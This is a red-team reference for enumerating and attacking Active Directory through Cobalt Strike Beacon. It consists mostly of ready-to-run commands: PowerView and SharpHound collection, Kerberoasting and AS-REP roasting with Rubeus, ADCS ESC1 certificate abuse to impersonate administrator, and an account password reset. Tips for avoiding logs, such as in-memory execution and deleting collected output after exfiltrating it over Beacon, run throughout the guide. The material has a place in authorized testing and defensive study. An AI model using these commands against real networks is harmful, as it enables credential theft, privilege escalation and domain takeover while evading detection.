# Cobalt Strike — Active Directory Enumeration (English)

> Comprehensive guide to enumerating Active Directory environments via Cobalt Strike Beacon. Covers BloodHound data collection, PowerView, LDAP queries, trust enumeration, and identifying attack paths.

---

## Table of Contents

1. [AD Enumeration Strategy](#1-ad-enumeration-strategy)
2. [Basic Domain Recon](#2-basic-domain-recon)
3. [User Enumeration](#3-user-enumeration)
4. [Group Enumeration](#4-group-enumeration)
5. [Computer Enumeration](#5-computer-enumeration)
6. [GPO & OU Enumeration](#6-gpo--ou-enumeration)
7. [Trust Enumeration](#7-trust-enumeration)
8. [ACL Enumeration](#8-acl-enumeration)
9. [Service Principal Names (SPN)](#9-service-principal-names-spn)
10. [BloodHound Data Collection](#10-bloodhound-data-collection)
11. [PowerView Commands Reference](#11-powerview-commands-reference)
12. [ADCS Enumeration](#12-adcs-enumeration)
13. [LDAP Direct Queries](#13-ldap-direct-queries)
14. [Situational Awareness BOFs](#14-situational-awareness-bofs)
15. [Attack Path Identification](#15-attack-path-identification)

---

## 1. AD Enumeration Strategy

### Minimal-Noise Approach

Prefer in-memory tools and LOLBins over dropped executables:

```
Priority 1: Beacon net commands (built-in, no extra tools)
Priority 2: PowerView via powerpick (no powershell.exe, no file drop)
Priority 3: execute-assembly (SharpHound, Seatbelt, ADSearch) — in-memory .NET
Priority 4: Situational Awareness BOFs — inline, no fork&run process
Priority 5: shell net/nltest commands — uses system tools, visible in 4688 logs
```

### What to Enumerate

```
Domain info → computers → users → groups → GPO → ACLs → trusts → SPNs → ADCS
```

---

## 2. Basic Domain Recon

### Domain Information

```
beacon> net domain
beacon> net dclist
beacon> net domain_controllers
beacon> net domain_trusts

beacon> shell whoami /all
beacon> shell echo %userdomain%
beacon> shell echo %logonserver%

# Full domain info via nltest
beacon> shell nltest /dsgetdc:%userdomain%
beacon> shell nltest /domain_trusts /all_trusts /v

# Domain SID
beacon> shell wmic computersystem get domain
beacon> powerpick Get-ADDomain | Select-Object Name,DNSRoot,DomainSID,PDCEmulator
```

### Domain Controller Discovery

```
beacon> net dclist
beacon> shell nslookup -type=SRV _ldap._tcp.dc._msdcs.corp.local
beacon> shell nslookup -type=SRV _kerberos._tcp.dc._msdcs.corp.local

# More detailed via PowerView:
beacon> powerpick-import /opt/tools/PowerView.ps1
beacon> powerpick Get-DomainController | Select-Object Name,IPAddress,Domain,Forest,OSVersion,Roles
```

### Forest Information

```
beacon> powerpick Get-ForestDomain
beacon> powerpick Get-ForestTrust
beacon> powerpick Get-Forest | Select-Object Name,ForestMode,Domains,GlobalCatalogs
```

---

## 3. User Enumeration

### List All Domain Users

```
beacon> net users                              # local users
beacon> shell net user /domain                 # all domain users
beacon> powerpick Get-DomainUser | Select-Object SamAccountName,Description,PasswordLastSet,LastLogonDate
```

### Find High-Value Users

```
# Domain Admins
beacon> net group "Domain Admins"
beacon> powerpick Get-DomainGroupMember "Domain Admins" -Recurse | Select-Object GroupName,MemberName,MemberDomain

# Enterprise Admins
beacon> powerpick Get-DomainGroupMember "Enterprise Admins" -Recurse

# Schema Admins
beacon> powerpick Get-DomainGroupMember "Schema Admins" -Recurse

# Protected Users (can't use NTLM)
beacon> powerpick Get-DomainGroupMember "Protected Users"

# Accounts with AdminCount=1 (AdminSDHolder protected)
beacon> powerpick Get-DomainUser -AdminCount | Select-Object SamAccountName,AdminCount
```

### Find Active Users (Reduce Noise on Inactive Accounts)

```
beacon> powerpick Get-DomainUser -Properties SamAccountName,LastLogonDate | Where-Object {$_.LastLogonDate -gt (Get-Date).AddDays(-30)} | Select-Object SamAccountName,LastLogonDate
```

### Find Users with No Pre-Auth Required (AS-REP Roastable)

```
beacon> powerpick Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select-Object SamAccountName,UserAccountControl
beacon> execute-assembly /opt/tools/Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

### Find Users with Password Never Expires

```
beacon> powerpick Get-DomainUser -UACFilter PASSWORD_NEVER_EXPIRES | Select-Object SamAccountName,Description
```

### Find Users Who Haven't Changed Password in > 90 Days

```
beacon> powerpick Get-DomainUser | Where-Object {$_.PasswordLastSet -lt (Get-Date).AddDays(-90)} | Select-Object SamAccountName,PasswordLastSet
```

### Enumerate Who Is Logged On

```
beacon> net logons                             # current logons via Beacon net
beacon> net sessions                           # SMB sessions
beacon> shell qwinsta /server:dc01            # terminal sessions
beacon> powerpick Get-NetLoggedon -ComputerName dc01.corp.local
beacon> powerpick Get-NetSession -ComputerName dc01.corp.local
```

### Find Where Domain Admins Are Logged On

```
# BloodHound covers this best, but manual approach:
beacon> powerpick $DAs = (Get-DomainGroupMember "Domain Admins").MemberName; foreach ($computer in (Get-DomainComputer | Select-Object -Expand DNSHostName)) { $sessions = Get-NetSession -ComputerName $computer -ErrorAction SilentlyContinue; foreach ($s in $sessions) { if ($DAs -contains $s.username) { Write-Host "DA $($s.username) on $computer" } } }
```

---

## 4. Group Enumeration

### List All Groups

```
beacon> net groups
beacon> powerpick Get-DomainGroup | Select-Object SamAccountName,Description,GroupScope,GroupCategory
```

### Enumerate Specific Group Members

```
beacon> net group "Domain Admins"
beacon> net group "Enterprise Admins"
beacon> net group "Backup Operators"         # can read backup files — potential for NTDS
beacon> net group "Account Operators"        # can manage users
beacon> net group "Server Operators"         # can logon to DCs
beacon> net group "Print Operators"          # can logon to DCs
beacon> net group "Remote Desktop Users"
beacon> net group "DNS Admins"               # can load arbitrary DLL into DNS service (DLL injection to SYSTEM)

beacon> net localgroup                       # local groups on this host
beacon> net localgroup "Administrators"      # local admins
beacon> net localgroup "Remote Desktop Users"
```

### Find Groups with Interesting Permissions

```
beacon> powerpick Get-DomainGroup | Where-Object {$_.Description -like "*admin*" -or $_.Description -like "*service*" -or $_.Description -like "*backup*"}
```

---

## 5. Computer Enumeration

### List All Domain Computers

```
beacon> net computers
beacon> powerpick Get-DomainComputer | Select-Object Name,DNSHostName,OperatingSystem,LastLogonDate | Sort-Object LastLogonDate -Descending
```

### Find Servers vs. Workstations

```
beacon> powerpick Get-DomainComputer -OperatingSystem "*Server*" | Select-Object Name,OperatingSystem,DNSHostName
beacon> powerpick Get-DomainComputer -OperatingSystem "*Workstation*" | Select-Object Name,OperatingSystem
```

### Find Computers with Unconstrained Delegation

```
beacon> powerpick Get-DomainComputer -Unconstrained | Select-Object Name,ServicePrincipalName
```

> Unconstrained delegation computers store TGTs of any user that authenticates to them — prime target for token harvesting.

### Find Computers with Constrained Delegation

```
beacon> powerpick Get-DomainComputer -TrustedToAuth | Select-Object Name,msds-allowedtodelegateto
```

### Find Computers With Local Admin Rights for Current User

```
beacon> powerpick Find-LocalAdminAccess -Verbose
# Note: This is very loud — generates authentication events on each host
```

---

## 6. GPO & OU Enumeration

### List All GPOs

```
beacon> powerpick Get-DomainGPO | Select-Object DisplayName,GpcFileSysPath,WhenCreated
```

### Find GPOs Applied to Specific OU

```
beacon> powerpick Get-DomainGPO -ComputerName dc01.corp.local
beacon> powerpick Get-DomainOUGPO -Identity "Domain Controllers"
```

### Find Restricted Groups in GPOs (Local Admin via GPO)

```
beacon> powerpick Get-DomainGPOLocalGroup | Select-Object GPODisplayName,GroupName,GroupMemberOf,GroupMembers
```

### Find GPOs with Write Rights for Current User

```
beacon> powerpick Get-DomainGPO | ForEach-Object { Get-DomainObjectAcl $_.DistinguishedName | Where-Object {$_.SecurityIdentifier -match (Get-DomainUser $env:USERNAME).objectsid} }
```

### OU Enumeration

```
beacon> powerpick Get-DomainOU | Select-Object Name,DistinguishedName
beacon> powerpick Get-DomainOU | ForEach-Object { Get-DomainObjectAcl $_.DistinguishedName | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner"} }
```

---

## 7. Trust Enumeration

### Enumerate All Trusts

```
beacon> net domain_trusts
beacon> shell nltest /domain_trusts /all_trusts /v

beacon> powerpick Get-DomainTrust | Select-Object SourceName,TargetName,TrustType,TrustDirection,TrustAttributes
beacon> powerpick Get-ForestTrust
```

### Trust Types Explained

| Type | Meaning |
|---|---|
| `WITHIN_FOREST` | Trusts between domains in same forest |
| `UPLEVEL` (Kerberos) | Kerberos-based trust |
| `DOWNLEVEL` (NTLM) | NTLM-based trust |
| `FOREST_TRANSITIVE` | Full forest trust — bidirectional TGT referrals |
| `EXTERNAL` | Non-transitive trust to external domain |

### Enumerate Trusted Forest Users

```
beacon> powerpick Get-DomainUser -Domain trusted.forest.com
beacon> powerpick Get-DomainGroup -Domain trusted.forest.com | Where-Object {$_.SamAccountName -like "*admin*"}
```

---

## 8. ACL Enumeration

ACL misconfigurations are often the most impactful lateral movement and privilege escalation paths.

### Find All Objects Where Current User Has Write Rights

```
beacon> powerpick Find-InterestingDomainAcl | Select-Object ObjectDN,ActiveDirectoryRights,SecurityIdentifier,IdentityReferenceName
```

### Interesting Rights to Look For

| Right | Impact |
|---|---|
| `GenericAll` | Full control — add to group, change password, etc. |
| `WriteDACL` | Modify DACL — grant yourself any right |
| `WriteOwner` | Take ownership → then WriteDACL |
| `GenericWrite` | Write to specific attributes |
| `ForceChangePassword` | Reset password without knowing current |
| `AddMember` | Add members to group |
| `AllExtendedRights` | All extended rights |
| `Self` | Write to self-referencing properties |
| `DCSync rights` | DS-Replication-Get-Changes + DS-Replication-Get-Changes-All |

### Find Users Who Can DCSync

```
beacon> powerpick (Get-DomainObjectAcl "DC=corp,DC=local" -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "DS-Replication-Get-Changes"}).SecurityIdentifier | ForEach-Object { Get-DomainObject -Identity $_ | Select-Object SamAccountName,DistinguishedName }
```

### Check Specific User/Computer ACL

```
beacon> powerpick Get-DomainObjectAcl "CN=jsmith,CN=Users,DC=corp,DC=local" -ResolveGUIDs
beacon> powerpick Get-DomainObjectAcl "CN=Domain Admins,CN=Users,DC=corp,DC=local" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Write|GenericAll"}
```

---

## 9. Service Principal Names (SPN)

### Find Kerberoastable Users

```
beacon> powerpick Get-DomainUser -SPN | Select-Object SamAccountName,ServicePrincipalName,PasswordLastSet,Description

# Via net command:
beacon> shell setspn -Q */*

# Via Rubeus:
beacon> execute-assembly /opt/tools/Rubeus.exe kerberoast /stats      # statistics only
beacon> execute-assembly /opt/tools/Rubeus.exe kerberoast /outfile:hashes.txt   # request all
beacon> execute-assembly /opt/tools/Rubeus.exe kerberoast /user:sqlsvc /rc4opsec   # single user
```

### Find Computer SPNs

```
beacon> powerpick Get-DomainComputer | Where-Object {$_.ServicePrincipalName} | Select-Object Name,ServicePrincipalName
```

### Common Service Types

```
MSSQLSvc    — SQL Server (often runs as a service account)
HTTP        — Web services
CIFS        — SMB file shares
HOST        — RPC/NetBIOS
WSMAN       — WinRM
```

---

## 10. BloodHound Data Collection

### SharpHound Collection

```
# Collect all data (loudest — generates many authentication events)
beacon> execute-assembly /opt/tools/SharpHound.exe -c All -d corp.local --zipfilename bh_output.zip

# Collect specific methods (quieter)
beacon> execute-assembly /opt/tools/SharpHound.exe -c DCOnly         # DC only — enumerate AD objects
beacon> execute-assembly /opt/tools/SharpHound.exe -c Group,User,ObjectProps  # no computer sessions
beacon> execute-assembly /opt/tools/SharpHound.exe -c ComputerOnly   # local admin/session data

# Stealth collection (slow, less accurate)
beacon> execute-assembly /opt/tools/SharpHound.exe -c All --stealth

# Target specific domain
beacon> execute-assembly /opt/tools/SharpHound.exe -c All -d trusted.forest.com

# Output to specific path
beacon> execute-assembly /opt/tools/SharpHound.exe -c All --outputdirectory C:\Temp --zipfilename bh.zip
```

### Download BloodHound Output

```
beacon> download C:\Temp\bh_output.zip
beacon> rm C:\Temp\bh_output.zip
```

### Key BloodHound Queries (Cypher)

Run these in BloodHound after importing data:

```cypher
-- Find shortest path to Domain Admins from owned users
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

-- Find all users with DCSync rights
MATCH (u)-[r:GetChanges|GetChangesAll]->(d:Domain) RETURN u,r,d

-- Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

-- Find computers where DA is logged on
MATCH p=(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})-[:MemberOf|HasSession*1..]->(c:Computer) RETURN p

-- Find users with GenericAll on high-value targets
MATCH (u:User)-[r:GenericAll]->(t) WHERE t.highvalue=true RETURN u,r,t

-- All kerberoastable users
MATCH (u:User) WHERE u.hasspn=true RETURN u

-- Computers with local admin access from non-admin users
MATCH (u:User)-[r:AdminTo]->(c:Computer) WHERE NOT u.name CONTAINS "ADMIN" RETURN u,r,c
```

---

## 11. PowerView Commands Reference

### Import PowerView

```
beacon> powershell-import /opt/tools/PowerView.ps1
# Then use powerpick for all subsequent PS commands
```

### Complete PowerView Function Reference

```coffeescript
# Domain Functions
Get-DomainPolicy                               # domain and DC policy (lockout, password, etc.)
Get-DomainPolicy -source dc                   # DC policy specifically
Get-DomainSID                                  # current domain SID

# User Functions
Get-DomainUser                                 # all users
Get-DomainUser -Identity jsmith               # specific user
Get-DomainUser -SPN                           # users with SPNs
Get-DomainUser -AdminCount                    # AdminSDHolder protected
Get-DomainUser -UACFilter PASSWD_NOTREQD     # password not required
Get-DomainUser -LDAPFilter "(description=*pass*)"  # desc contains "pass"
Get-DomainUser -SearchBase "OU=Finance,DC=corp,DC=local"   # specific OU

# Group Functions
Get-DomainGroup                                # all groups
Get-DomainGroup -Identity "Domain Admins"    # specific group
Get-DomainGroupMember "Domain Admins" -Recurse   # recursive members
Get-DomainGroup -MemberIdentity jsmith       # groups user is in

# Computer Functions
Get-DomainComputer                             # all computers
Get-DomainComputer -OperatingSystem "*2022*"  # filter by OS
Get-DomainComputer -Unconstrained             # unconstrained delegation
Get-DomainComputer -TrustedToAuth             # constrained delegation
Get-DomainComputer -Ping                      # only reachable hosts
Get-DomainComputer -Properties Name,IPv4Address  # specific properties

# GPO Functions
Get-DomainGPO                                  # all GPOs
Get-DomainGPO -Identity "{GUID}"              # specific GPO
Get-DomainGPOLocalGroup                        # local group settings in GPOs
Get-DomainGPOUserLocalGroupMapping            # map users to local admin via GPO
Get-DomainOU                                   # all OUs

# Trust Functions
Get-DomainTrust                                # all trusts
Get-DomainTrust -Domain corp.local            # trusts for specific domain
Get-ForestTrust                                # forest trusts
Get-ForestDomain                               # all domains in forest

# ACL Functions
Get-DomainObjectAcl "DC=corp,DC=local" -ResolveGUIDs   # domain object ACL
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs  # group ACL
Find-InterestingDomainAcl                     # find all interesting ACLs
Add-DomainObjectAcl                            # add ACE (requires write rights)

# Object Modification
Set-DomainObject -Identity jsmith -Set @{description="new desc"}   # modify attribute
Set-DomainUserPassword -Identity jsmith -AccountPassword (ConvertTo-SecureString "NewPass123" -AsPlainText -Force)

# Session/Logon
Get-NetLoggedon -ComputerName dc01            # who is logged on
Get-NetSession -ComputerName dc01             # SMB sessions
Get-NetRDPSession -ComputerName dc01          # RDP sessions
Find-DomainUserLocation                        # find where users are logged on (loud)

# Share Enumeration
Find-DomainShare                               # all reachable shares
Find-DomainShare -CheckShareAccess            # only shares current user can access
Find-InterestingDomainShareFile               # search file shares for interesting files
Find-InterestingDomainShareFile -Include *.kdbx,*.xlsx,passwords.*,*.config

# Local Admin
Find-LocalAdminAccess                          # find hosts where user is local admin
```

---

## 12. ADCS Enumeration

### Find Certificate Authorities

```
beacon> execute-assembly /opt/tools/Certify.exe cas
beacon> powerpick Get-DomainObject -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
```

### Find Vulnerable Templates (ESC1–ESC8)

```
beacon> execute-assembly /opt/tools/Certify.exe find /vulnerable
beacon> execute-assembly /opt/tools/Certify.exe find /enrolleeSuppliesSubject    # ESC1
beacon> execute-assembly /opt/tools/Certify.exe find /clientauth               # templates for client auth
```

### Common ADCS Escalation Paths (ESC Numbers)

| ESC | Vulnerability | Impact |
|---|---|---|
| ESC1 | CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU | Enroll cert with any SAN → domain admin |
| ESC2 | Any Purpose or No EKU + over-privileged enroll | Universal cert |
| ESC3 | Certificate Request Agent template abuse | Enroll on behalf of any user |
| ESC4 | Write permissions on template | Modify template → ESC1 |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 CA flag | Request cert with any SAN for any template |
| ESC7 | Manage CA rights | Enable arbitrary flags |
| ESC8 | Web enrollment endpoint + NTLM relay | Relay to get cert for DC |

### Request Certificate for Privilege Escalation (ESC1)

```
beacon> execute-assembly /opt/tools/Certify.exe request /ca:ca01.corp.local\corp-CA /template:VulnerableTemplate /altname:administrator

# Convert PEM → PFX (operator box)
# openssl pkcs12 -in cert.pem -keyex -CSP "..." -export -out cert.pfx

# Use cert to get TGT
beacon> upload cert.pfx
beacon> execute-assembly /opt/tools/Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:certpass /ptt
```

---

## 13. LDAP Direct Queries

For environments where tools are flagged, use raw LDAP queries:

```
# Via .NET System.DirectoryServices (in-memory)
beacon> powerpick $searcher = New-Object System.DirectoryServices.DirectorySearcher; $searcher.Filter = "(objectCategory=user)(adminCount=1)"; $searcher.PropertiesToLoad.Add("sAMAccountName") | Out-Null; $searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"] }

# Via ADSearch.exe (execute-assembly)
beacon> execute-assembly /opt/tools/ADSearch.exe --search "(&(objectCategory=user)(adminCount=1))" --attributes samaccountname,description

# Find all computers
beacon> execute-assembly /opt/tools/ADSearch.exe --search "(objectCategory=computer)" --attributes name,dNSHostName,operatingSystem

# Find SPNs
beacon> execute-assembly /opt/tools/ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes sAMAccountName,servicePrincipalName
```

### Common LDAP Filters

```
# All users with password never expires
(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))

# All disabled users
(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2))

# All users without pre-auth required
(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# All computers with delegation
(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))

# All groups with name containing "admin"
(&(objectCategory=group)(cn=*admin*))

# Specific user
(&(objectCategory=user)(sAMAccountName=jsmith))
```

---

## 14. Situational Awareness BOFs

BOFs for AD enumeration that run inline without fork&run:

```
# whoami-bof — get full token/group info without spawning processes
beacon> inline-execute /opt/bofs/whoami.o

# Listdrivers — list loaded drivers
beacon> inline-execute /opt/bofs/listdrivers.o

# nslookup — DNS resolution
beacon> inline-execute /opt/bofs/nslookup.o dc01.corp.local

# netstat — network connections (no netstat.exe spawn)
beacon> inline-execute /opt/bofs/netstat.o

# netview — enumerate hosts and sessions
beacon> inline-execute /opt/bofs/netview.o

# schtasksList — list scheduled tasks without schtasks.exe spawn
beacon> inline-execute /opt/bofs/schtasksList.o

# registry — query registry without reg.exe spawn
beacon> inline-execute /opt/bofs/reg.o query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Community BOF collections for SA:
- `trustedsec/CS-Situational-Awareness-BOF`
- `OutflankNL/CS-Remote-OPs-BOF`

---

## 15. Attack Path Identification

### Summary Decision Tree

```
Current Position (low priv domain user)
    │
    ├─ Check group memberships → any interesting groups?
    │       ↓
    │   Find local admin access → Find-LocalAdminAccess
    │       ↓
    │   Move there → inject/dump → higher priv token
    │
    ├─ Check ACLs → GenericAll/WriteDACL on any high-value object?
    │       ↓
    │   Abuse the ACL → password reset / group add / DCSync grant
    │
    ├─ Kerberoast → any crackable service account hashes?
    │       ↓
    │   Crack offline → get service account creds
    │
    ├─ AS-REP roast → any DONT_REQ_PREAUTH users?
    │
    ├─ Unconstrained delegation hosts → coerce DC to auth → steal TGT
    │
    ├─ Constrained delegation → S4U2Self → S4U2Proxy
    │
    ├─ ADCS vulnerable templates → ESC1–ESC8 → cert-based auth
    │
    └─ Trust hopping → if forest trust, find cross-forest paths
```

### Finding Path with BloodHound

After importing SharpHound data:

```
1. Mark your current user as "Owned"
2. Run: "Find Shortest Paths to Domain Admins"
3. Run: "Find Principals with DCSync Rights"
4. Run: "List All Kerberoastable Accounts"
5. Run: "Find Computers with Unconstrained Delegation"
6. Run: "Shortest Paths to Unconstrained Delegation Systems"
```

---

*Last updated: 2026-06-09 | Reference for authorized red team use only.*
